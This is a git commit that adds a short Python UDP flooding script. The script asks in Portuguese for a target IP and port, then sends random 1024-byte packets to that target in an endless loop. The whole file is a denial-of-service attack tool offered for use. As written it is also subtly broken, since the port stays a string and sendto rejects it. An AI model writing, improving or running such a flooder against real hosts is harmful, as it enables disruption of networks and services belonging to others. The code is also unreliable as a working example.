a6457937c1b90026f7a8e8691489903950c27094
Pedro Henrique Altimari Fontes <83617644+fontespedro@users.noreply.github.com>
2022-06-22 17:02:16 -0300

    udp-flooder

---
+++ udp-flooder.py
@@ -0,0 +1,13 @@
+import socket
+import random 
+
+ip = input("Escolha o IP para flodar: ")
+port = input("Escolha a porta do " + ip + " que deseja flodar: ")
+
+print("Flooding: ", ip + ":" + port)
+
+client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+packet = random._urandom(1024)
+
+while True:
+    client.sendto(packet, (ip, port))
